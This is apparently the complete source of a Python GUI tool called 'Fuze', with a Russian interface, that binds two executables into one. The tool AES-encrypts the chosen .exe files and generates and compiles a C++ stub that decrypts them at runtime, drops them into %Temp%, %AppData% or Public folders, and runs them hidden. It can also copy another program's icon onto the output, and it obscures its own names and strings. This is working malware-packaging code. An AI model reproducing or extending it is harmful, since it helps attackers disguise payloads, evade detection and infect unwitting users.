import customtkinter as ctk
from tkinter import filedialog, messagebox, Canvas
import os
import subprocess
import sys
import threading
import time
import base64
import shutil
import struct
import secrets as _s
import json
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import random

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

_SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
_CONFIG_PATH = os.path.join(_SCRIPT_DIR, "fuze_config.json")


def _load_config():
    try:
        with open(_CONFIG_PATH, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception:
        return {}


def _save_config(cfg):
    try:
        with open(_CONFIG_PATH, 'w', encoding='utf-8') as f:
            json.dump(cfg, f, indent=2)
    except Exception:
        pass


def _autodetect_mingw_bin():
    for tool in ("g++", "windres"):
        if shutil.which(tool) is None:
            break
    else:
        return None

    local = os.path.join(_SCRIPT_DIR, "tools", "mingw64", "bin")
    if os.path.exists(os.path.join(local, "g++.exe")) or os.path.exists(os.path.join(local, "g++")):
        return local
    return ""


def _validate_mingw_bin(path):
    if not path or not os.path.isdir(path):
        return False
    gxx = os.path.join(path, "g++.exe")
    if not os.path.exists(gxx):
        gxx = os.path.join(path, "g++")
    wr = os.path.join(path, "windres.exe")
    if not os.path.exists(wr):
        wr = os.path.join(path, "windres")
    return os.path.exists(gxx) and os.path.exists(wr)


def _x1():
    return _s.token_bytes(32)


def _x2(_p, _k):
    try:
        with open(_p, 'rb') as _f:
            _d = _f.read()
    except Exception as _e:
        raise Exception(base64.b64decode(b'RXJyb3IgcmVhZGluZyBmaWxl').decode() + f' {_p}: {_e}')
    _i = _s.token_bytes(16)
    _c = Cipher(algorithms.AES(_k), modes.CBC(_i), backend=default_backend())
    _e = _c.encryptor()
    _pd = padding.PKCS7(128).padder()
    _pdd = _pd.update(_d) + _pd.finalize()
    _ed = _e.update(_pdd) + _e.finalize()
    return _i, _ed


def _x3(_ed1, _i1, _k1, _ed2, _i2, _k2, _op, _oen1, _oen2, _drop1, _drop2):
    def to_cpp_array(data):
        return "{" + ",".join([str(b) for b in data]) + "}"

    _cpp_code = f"""
#include <windows.h>
#include <shlobj.h>
#include <fstream>
#include <vector>
#include <string>

unsigned char enc1[] = {to_cpp_array(_ed1)};
unsigned char iv1[] = {to_cpp_array(_i1)};
unsigned char key1[] = {to_cpp_array(_k1)};

unsigned char enc2[] = {to_cpp_array(_ed2)};
unsigned char iv2[] = {to_cpp_array(_i2)};
unsigned char key2[] = {to_cpp_array(_k2)};

bool DecryptAES(unsigned char* encData, DWORD encLen, unsigned char* key, unsigned char* iv, std::vector<unsigned char>& outData) {{
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return false;

    struct {{
        BLOBHEADER hdr;
        DWORD dwKeySize;
        BYTE rgbKeyData[32];
    }} keyBlob;

    keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
    keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
    keyBlob.hdr.reserved = 0;
    keyBlob.hdr.aiKeyAlg = CALG_AES_256;
    keyBlob.dwKeySize = 32;
    memcpy(keyBlob.rgbKeyData, key, 32);

    if (!CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey)) {{
        CryptReleaseContext(hProv, 0);
        return false;
    }}

    if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {{
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        return false;
    }}

    DWORD dataLen = encLen;
    unsigned char* decrypted = new unsigned char[dataLen];
    memcpy(decrypted, encData, dataLen);

    if (!CryptDecrypt(hKey, 0, TRUE, 0, decrypted, &dataLen)) {{
        delete[] decrypted;
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        return false;
    }}

    outData.assign(decrypted, decrypted + dataLen);

    delete[] decrypted;
    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);
    return true;
}}

std::string GetTargetDir(int dropOption) {{
    char path[MAX_PATH];
    if (dropOption == 0) {{ 
        GetTempPathA(MAX_PATH, path);
    }} else if (dropOption == 1) {{ 
        SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path);
        strcat(path, "\\\\");
    }} else if (dropOption == 2) {{ 
        GetModuleFileNameA(NULL, path, MAX_PATH);
        char* p = strrchr(path, '\\\\');
        if (p) *(p+1) = 0;
    }} else if (dropOption == 3) {{ 
        ExpandEnvironmentStringsA("%PUBLIC%", path, MAX_PATH);
        strcat(path, "\\\\");
    }}
    return std::string(path);
}}

void DropAndRun(const char* filename, const std::vector<unsigned char>& data, int dropOption) {{
    std::string dir = GetTargetDir(dropOption);
    std::string fullPath = dir + filename;
    
    std::ofstream out(fullPath, std::ios::binary);
    out.write(reinterpret_cast<const char*>(data.data()), data.size());
    out.close();

    ShellExecuteA(NULL, "open", fullPath.c_str(), NULL, NULL, SW_HIDE);
}}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
    std::vector<unsigned char> dec1, dec2;
    
    if (DecryptAES(enc1, sizeof(enc1), key1, iv1, dec1)) {{
        DropAndRun("{_oen1}", dec1, {_drop1});
    }}
    
    if (DecryptAES(enc2, sizeof(enc2), key2, iv2, dec2)) {{
        DropAndRun("{_oen2}", dec2, {_drop2});
    }}

    return 0;
}}
"""
    with open(_op, 'w', encoding='utf-8') as _f:
        _f.write(_cpp_code)


def extract_icon_from_pe(pe_path, out_ico_path):
    with open(pe_path, 'rb') as f:
        pe = f.read()

    e_lfanew = struct.unpack_from('<I', pe, 0x3C)[0]
    opt_hdr_off = e_lfanew + 24
    magic = struct.unpack_from('<H', pe, opt_hdr_off)[0]

    if magic == 0x10B:
        dd_off = opt_hdr_off + 96
    elif magic == 0x20B:
        dd_off = opt_hdr_off + 112
    else:
        return False

    res_rva = struct.unpack_from('<I', pe, dd_off + 8 * 2)[0]
    res_size = struct.unpack_from('<I', pe, dd_off + 8 * 2 + 4)[0]

    if res_rva == 0 or res_size == 0:
        return False

    num_sections = struct.unpack_from('<H', pe, e_lfanew + 6)[0]
    size_opt_hdr = struct.unpack_from('<H', pe, e_lfanew + 20)[0]
    sec_off = e_lfanew + 24 + size_opt_hdr

    res_file_off = 0
    for i in range(num_sections):
        sec = sec_off + i * 40
        v_addr = struct.unpack_from('<I', pe, sec + 12)[0]
        v_size = struct.unpack_from('<I', pe, sec + 8)[0]
        raw_off = struct.unpack_from('<I', pe, sec + 20)[0]
        if v_addr <= res_rva < v_addr + v_size:
            res_file_off = raw_off + (res_rva - v_addr)
            break

    if res_file_off == 0:
        return False

    def read_dir(off):
        num_named, num_id = struct.unpack_from('<HH', pe, off + 12)
        entries = []
        for i in range(num_named + num_id):
            e_off = off + 16 + i * 8
            name_or_id, data_rva_or_subdir = struct.unpack_from('<II', pe, e_off)
            is_subdir = (data_rva_or_subdir & 0x80000000) != 0
            entries.append((name_or_id, data_rva_or_subdir & 0x7FFFFFFF, is_subdir))
        return entries

    root_entries = read_dir(res_file_off)
    group_icons = []
    icons = {}

    for type_id, sub_off, is_subdir in root_entries:
        if is_subdir and type_id in (3, 14):
            lvl1_entries = read_dir(res_file_off + sub_off)
            for res_id, sub2_off, is_subdir2 in lvl1_entries:
                if is_subdir2:
                    lvl2_entries = read_dir(res_file_off + sub2_off)
                    for lang_id, data_off, is_subdir3 in lvl2_entries:
                        if not is_subdir3:
                            data_rva = struct.unpack_from('<I', pe, res_file_off + data_off)[0]
                            data_size = struct.unpack_from('<I', pe, res_file_off + data_off + 4)[0]
                            file_off = res_file_off + (data_rva - res_rva)

                            if type_id == 14:
                                group_icons.append((res_id, file_off, data_size))
                            elif type_id == 3:
                                icons[res_id] = (file_off, data_size)

    if not group_icons:
        return False

    res_id, grp_off, grp_size = group_icons[0]
    id_count = struct.unpack_from('<H', pe, grp_off + 4)[0]

    ico_data = struct.pack('<HHH', 0, 1, id_count)
    ico_entries = b''
    ico_images = b''

    offset = 6 + (16 * id_count)

    for i in range(id_count):
        entry_off = grp_off + 6 + (i * 14)
        w, h, cc, res, planes, bitcount, bytes_in_res, icon_id = struct.unpack_from('<BBBBHHIH', pe, entry_off)
        w = w if w != 0 else 256
        h = h if h != 0 else 256

        if icon_id not in icons:
            continue

        icon_off, icon_size = icons[icon_id]
        icon_img = pe[icon_off:icon_off + icon_size]

        ico_entries += struct.pack('<BBBBHHII', w if w < 256 else 0, h if h < 256 else 0, cc, 0, planes, bitcount, icon_size, offset)
        ico_images += icon_img
        offset += icon_size

    with open(out_ico_path, 'wb') as f:
        f.write(ico_data)
        f.write(ico_entries)
        f.write(ico_images)

    return True


class FileWrapperApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Fuze - C++ Builder")
        self.root.geometry("500x720")
        self.root.resizable(False, False)

        self.file1_path = None
        self.file2_path = None
        self.icon_path = None
        self.temp_icon_path = None
        self.status_label_text = "Файлы не выбраны"
        self.animating = False
        self.particles = []
        self.canvas = None

        self.drop_options = ["%Temp%", "%AppData%", "Рядом с .exe", "C:\\Users\\Public"]
        self.drop1_val = ctk.StringVar(value=self.drop_options[0])
        self.drop2_val = ctk.StringVar(value=self.drop_options[0])

        cfg = _load_config()
        saved = cfg.get("mingw_bin", "")
        if saved and _validate_mingw_bin(saved):
            self.mingw_bin = saved
        else:
            detected = _autodetect_mingw_bin()
            if detected is None:
                self.mingw_bin = ""
            elif detected:
                self.mingw_bin = detected
            else:
                self.mingw_bin = ""

        self.create_widgets()
        self.init_particles()
        self.animate_particles()
        self._refresh_mingw_label()

    def create_widgets(self):
        self.canvas = Canvas(self.root, bg="#212121", highlightthickness=0)
        self.canvas.place(relwidth=1, relheight=1)

        self.frame = ctk.CTkFrame(self.root, corner_radius=10, fg_color="#141414")
        self.frame.pack(pady=20, padx=20, fill="both", expand=True)

        version_label = ctk.CTkLabel(
            self.frame,
            text="version: 0.0.9 C++",
            font=ctk.CTkFont("Roboto", 14),
            text_color="#666666"
        )
        version_label.place(relx=0.95, rely=0.05, anchor="ne")

        self.label = ctk.CTkLabel(
            self.frame,
            text="Fuze",
            font=ctk.CTkFont("Roboto", 28, "bold")
        )
        self.label.pack(pady=10)

        self.file1_button = ctk.CTkButton(
            self.frame,
            text="Выбрать первый .exe",
            command=self.select_file1,
            font=ctk.CTkFont("Roboto", 16, "bold"),
            height=45
        )
        self.file1_button.pack(pady=10, padx=20, fill="x")

        self.drop1_menu = ctk.CTkOptionMenu(
            self.frame,
            variable=self.drop1_val,
            values=self.drop_options,
            font=ctk.CTkFont("Roboto", 14)
        )
        self.drop1_menu.pack(pady=5, padx=20, fill="x")

        self.file2_button = ctk.CTkButton(
            self.frame,
            text="Выбрать второй .exe",
            command=self.select_file2,
            font=ctk.CTkFont("Roboto", 16, "bold"),
            height=45
        )
        self.file2_button.pack(pady=10, padx=20, fill="x")

        self.drop2_menu = ctk.CTkOptionMenu(
            self.frame,
            variable=self.drop2_val,
            values=self.drop_options,
            font=ctk.CTkFont("Roboto", 14)
        )
        self.drop2_menu.pack(pady=5, padx=20, fill="x")

        icon_frame = ctk.CTkFrame(self.frame, fg_color="transparent")
        icon_frame.pack(pady=10, padx=20, fill="x")

        self.icon_button = ctk.CTkButton(
            icon_frame,
            text="Выбрать иконку (любой файл)",
            command=self.select_icon,
            font=ctk.CTkFont("Roboto", 16, "bold"),
            height=45,
            fg_color="#444444",
            hover_color="#333333"
        )
        self.icon_button.pack(side="left", fill="x", expand=True)

        self.clear_icon_btn = ctk.CTkButton(
            icon_frame,
            text="✕",
            command=self.clear_icon,
            font=ctk.CTkFont("Roboto", 16, "bold"),
            height=45,
            width=45,
            fg_color="#e74c3c",
            hover_color="#c0392b"
        )
        self.clear_icon_btn.pack(side="right", padx=(5, 0))
        self.clear_icon_btn.pack_forget()

        mingw_frame = ctk.CTkFrame(self.frame, fg_color="transparent")
        mingw_frame.pack(pady=(5, 0), padx=20, fill="x")

        self.mingw_button = ctk.CTkButton(
            mingw_frame,
            text="Указать папку MinGW\\bin",
            command=self.select_mingw_bin,
            font=ctk.CTkFont("Roboto", 14, "bold"),
            height=35,
            fg_color="#3a3a3a",
            hover_color="#2a2a2a"
        )
        self.mingw_button.pack(side="left", fill="x", expand=True)

        self.clear_mingw_btn = ctk.CTkButton(
            mingw_frame,
            text="✕",
            command=self.clear_mingw_bin,
            font=ctk.CTkFont("Roboto", 14, "bold"),
            height=35,
            width=35,
            fg_color="#e74c3c",
            hover_color="#c0392b"
        )
        self.clear_mingw_btn.pack(side="right", padx=(5, 0))

        self.mingw_label = ctk.CTkLabel(
            self.frame,
            text="",
            font=ctk.CTkFont("Roboto", 11),
            text_color="#888888",
            wraplength=420,
            justify="left"
        )
        self.mingw_label.pack(pady=(2, 5), padx=20, anchor="w")

        self.merge_button = ctk.CTkButton(
            self.frame,
            text="Скомпилировать (C++)",
            command=self.start_compilation,
            font=ctk.CTkFont("Roboto", 18, "bold"),
            height=45,
            fg_color="#27ae60",
            hover_color="#219653"
        )
        self.merge_button.pack(pady=10, padx=20, fill="x")

        self.status_label = ctk.CTkLabel(
            self.frame,
            text=self.status_label_text,
            font=ctk.CTkFont("Roboto", 16, "bold")
        )
        self.status_label.pack(pady=10)

    def _refresh_mingw_label(self):
        if self.mingw_bin:
            if _validate_mingw_bin(self.mingw_bin):
                self.mingw_label.configure(text=f"MinGW: {self.mingw_bin}", text_color="#27ae60")
            else:
                self.mingw_label.configure(text=f"MinGW: {self.mingw_bin}  (не найден g++/windres)", text_color="#e74c3c")
        else:
            if shutil.which("g++") and shutil.which("windres"):
                self.mingw_label.configure(text="MinGW: берётся из PATH", text_color="#888888")
            else:
                self.mingw_label.configure(text="MinGW не найден — укажи папку bin или добавь в PATH", text_color="#e74c3c")

    def select_mingw_bin(self):
        path = filedialog.askdirectory(title="Выбери папку bin внутри MinGW")
        if not path:
            return
        if not _validate_mingw_bin(path):
            messagebox.showerror(
                "Не то",
                "В этой папке нет g++.exe и windres.exe.\n"
                "Нужна именно подпапка bin внутри MinGW."
            )
            return
        self.mingw_bin = path
        cfg = _load_config()
        cfg["mingw_bin"] = path
        _save_config(cfg)
        self._refresh_mingw_label()

    def clear_mingw_bin(self):
        self.mingw_bin = ""
        cfg = _load_config()
        cfg.pop("mingw_bin", None)
        _save_config(cfg)
        self._refresh_mingw_label()

    def select_file1(self):
        path = filedialog.askopenfilename(filetypes=[("EXE files", "*.exe")])
        if path:
            self.file1_path = path
            fname = os.path.basename(path)
            self.file1_button.configure(text=f"1: {fname}")
            self.check_buttons()

    def select_file2(self):
        path = filedialog.askopenfilename(filetypes=[("EXE files", "*.exe")])
        if path:
            self.file2_path = path
            fname = os.path.basename(path)
            self.file2_button.configure(text=f"2: {fname}")
            self.check_buttons()

    def select_icon(self):
        path = filedialog.askopenfilename(filetypes=[("All files", "*.*")])
        if path:
            fname = os.path.basename(path)
            self.icon_button.configure(text=f"Иконка: {fname}")
            self.clear_icon_btn.pack(side="right", padx=(5, 0))

            if path.lower().endswith('.ico'):
                self.icon_path = path
                self.temp_icon_path = None
                return

            self.icon_path = None
            self.temp_icon_path = os.path.join(os.getcwd(), "temp_extracted.ico")

            try:
                if extract_icon_from_pe(path, self.temp_icon_path):
                    self.icon_path = self.temp_icon_path
                else:
                    messagebox.showwarning("Внимание", "Не удалось извлечь иконку из файла. Иконка не будет установлена.")
                    self.clear_icon()
            except Exception as e:
                messagebox.showerror("Ошибка иконки", str(e))
                self.clear_icon()

    def clear_icon(self):
        self.icon_path = None
        if self.temp_icon_path and os.path.exists(self.temp_icon_path):
            try:
                os.remove(self.temp_icon_path)
            except:
                pass
        self.temp_icon_path = None
        self.icon_button.configure(text="Выбрать иконку (любой файл)")
        self.clear_icon_btn.pack_forget()

    def check_buttons(self):
        if self.file1_path and self.file2_path:
            self.status_label.configure(text="Готово к сборке", text_color="#27ae60")
            self.merge_button.configure(state="normal")
        else:
            self.status_label.configure(text=self.status_label_text, text_color="gray")
            self.merge_button.configure(state="disabled")

    def init_particles(self):
        for _ in range(50):
            x = random.uniform(0, 500)
            y = random.uniform(0, 720)
            radius = random.uniform(1, 3)
            vy = random.uniform(-2, -0.5)
            alpha = random.uniform(0.3, 0.8)
            particle = self.canvas.create_oval(
                x - radius, y - radius, x + radius, y + radius,
                fill="#ffffff", outline=""
            )
            self.particles.append({"id": particle, "x": x, "y": y, "vy": vy, "alpha": alpha})

    def animate_particles(self):
        for particle in self.particles:
            particle["y"] += particle["vy"]
            particle["alpha"] -= 0.005
            if particle["y"] < -10 or particle["alpha"] <= 0:
                particle["y"] = random.uniform(670, 720)
                particle["x"] = random.uniform(0, 500)
                particle["vy"] = random.uniform(-2, -0.5)
                particle["alpha"] = random.uniform(0.3, 0.8)
            self.canvas.coords(
                particle["id"],
                particle["x"] - 2, particle["y"] - 2,
                particle["x"] + 2, particle["y"] + 2
            )
            self.canvas.itemconfig(particle["id"], fill="#ffffff")
        self.root.after(30, self.animate_particles)

    def _resolve_tool_env(self):
        env = os.environ.copy()

        if self.mingw_bin and _validate_mingw_bin(self.mingw_bin):
            env["PATH"] = self.mingw_bin + os.pathsep + env.get("PATH", "")
            gxx = os.path.join(self.mingw_bin, "g++.exe")
            windres = os.path.join(self.mingw_bin, "windres.exe")
            if not os.path.exists(gxx):
                gxx = os.path.join(self.mingw_bin, "g++")
            if not os.path.exists(windres):
                windres = os.path.join(self.mingw_bin, "windres")
            return gxx, windres, env

        gxx = shutil.which("g++")
        windres = shutil.which("windres")
        if not gxx or not windres:
            raise Exception(
                "MinGW не найден.\n"
                "Нажми «Указать папку MinGW\\bin» и выбери bin внутри распакованного MinGW,\n"
                "или добавь его в PATH и перезапусти скрипт."
            )
        return gxx, windres, env

    def compile_wrapper(self):
        _cd = os.getcwd()
        _en1 = os.path.basename(self.file1_path)
        _en2 = os.path.basename(self.file2_path)
        _ip1 = self.file1_path
        _ip2 = self.file2_path

        _twp = os.path.join(_cd, "temp_wrapper.cpp")
        _een = "file.exe"
        _oep = os.path.join(_cd, _een)

        try:
            self.animating = True
            threading.Thread(target=self.animate_status, daemon=True).start()

            if not os.path.exists(_ip1):
                raise Exception(f"Файл не найден: {_en1}")
            if not os.path.exists(_ip2):
                raise Exception(f"Файл не найден: {_en2}")

            _gxx, _windres, _env = self._resolve_tool_env()

            _k1 = _x1()
            _i1, _ed1 = _x2(_ip1, _k1)
            _k2 = _x1()
            _i2, _ed2 = _x2(_ip2, _k2)

            _drop1_idx = self.drop_options.index(self.drop1_val.get())
            _drop2_idx = self.drop_options.index(self.drop2_val.get())

            _x3(_ed1, _i1, _k1, _ed2, _i2, _k2, _twp, _en1, _en2, _drop1_idx, _drop2_idx)

            _compile_cmd = [
                _gxx,
                "-O3",
                "-s",
                "-static",
                "-mwindows",
                "-lole32",
                "-lshlwapi",
                _twp,
                "-o",
                _oep
            ]

            if self.icon_path:
                _rc_file = os.path.join(_cd, "temp.rc")
                _res_file = os.path.join(_cd, "temp.res")

                _icon_path_fixed = self.icon_path.replace("\\", "/")

                with open(_rc_file, 'w') as _f:
                    _f.write(f'1 ICON "{_icon_path_fixed}"')

                subprocess.run(
                    [_windres, _rc_file, "-O", "coff", "-o", _res_file],
                    check=True, env=_env
                )
                _compile_cmd.insert(len(_compile_cmd) - 2, _res_file)

            subprocess.run(_compile_cmd, check=True, env=_env)

            if not os.path.exists(_oep):
                raise Exception("G++ не создал исполняемый файл.")

            _files_to_clean = [_twp, os.path.join(_cd, "temp.rc"), os.path.join(_cd, "temp.res")]
            if self.temp_icon_path:
                _files_to_clean.append(self.temp_icon_path)

            for _tf in _files_to_clean:
                if os.path.exists(_tf):
                    os.remove(_tf)

            self.root.after(0, lambda: messagebox.showinfo("Успех", f"Файл собран: {_oep}"))
            self.status_label.configure(text="Готово!")

        except subprocess.CalledProcessError as e:
            err_msg = e.stderr.decode('utf-8', errors='ignore') if e.stderr else "Неизвестная ошибка компилятора"
            self.root.after(0, lambda: messagebox.showerror("Ошибка компиляции", err_msg))
            self.status_label.configure(text="Ошибка компиляции!")
        except Exception as e:
            self.root.after(0, lambda: messagebox.showerror("Ошибка", f"Ошибка: {str(e)}"))
            self.status_label.configure(text="Ошибка!")
        finally:
            self.animating = False

    def animate_status(self):
        dots = ["", ".", "..", "..."]
        index = 0
        while self.animating:
            self.status_label.configure(text=f"Компилирую{dots[index]}")
            index = (index + 1) % len(dots)
            time.sleep(0.5)
            self.root.update()

    def start_compilation(self):
        if not self.file1_path or not self.file2_path:
            messagebox.showerror("Ошибка", "Выберите оба .exe файла!")
            return
        threading.Thread(target=self.compile_wrapper, daemon=True).start()


if __name__ == "__main__":
    root = ctk.CTk()
    app = FileWrapperApp(root)
    root.mainloop()